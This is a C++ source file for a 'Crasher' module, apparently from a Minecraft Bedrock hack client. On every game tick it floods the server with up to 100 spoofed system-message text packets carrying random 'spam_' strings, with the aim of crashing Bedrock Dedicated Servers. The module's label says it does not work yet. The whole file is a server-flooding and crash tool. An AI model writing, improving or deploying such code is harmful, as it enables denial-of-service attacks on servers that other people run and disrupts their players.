#include "Crasher.h"

#include <../SDK/NetWork/Packets/TextPacket.h>
#include <Windows.h>

#include <cstdlib>
#include <string>

float packetsPerTick = 10.f;
int modeInt = 0;

Crasher::Crasher() : Module("Crasher", "(Doesn't work yet.)", Category::WORLD) {
    registerSetting(new EnumSetting("Mode", "Select crasher mode", {"BDS"}, &modeInt, 0));
    registerSetting(new SliderSetting<float>("PacketsPerTick", "Packets to send per tick",
                                             &packetsPerTick, 10.f, 1.f, 100.f));
}

void Crasher::onNormalTick(LocalPlayer* localPlayer) {
    if(!localPlayer)
        return;

    auto sender = Game.getPacketSender();
    if(!sender)
        return;

    for(int i = 0; i < static_cast<int>(packetsPerTick); ++i) {
        auto pkt = MinecraftPacket::createPacket(PacketID::Text);
        if(!pkt)
            continue;

        auto* textPkt = reinterpret_cast<TextPacket*>(pkt.get());
        textPkt->mType = TextPacketType::SystemMessage;
        textPkt->mAuthor = "Player";
        textPkt->mMessage = "spam_" + std::to_string(rand() % 100000);
        textPkt->mLocalize = false;
        textPkt->mXuid = "";
        textPkt->mPlatformId = "";

        sender->sendToServer(textPkt);
    }
}
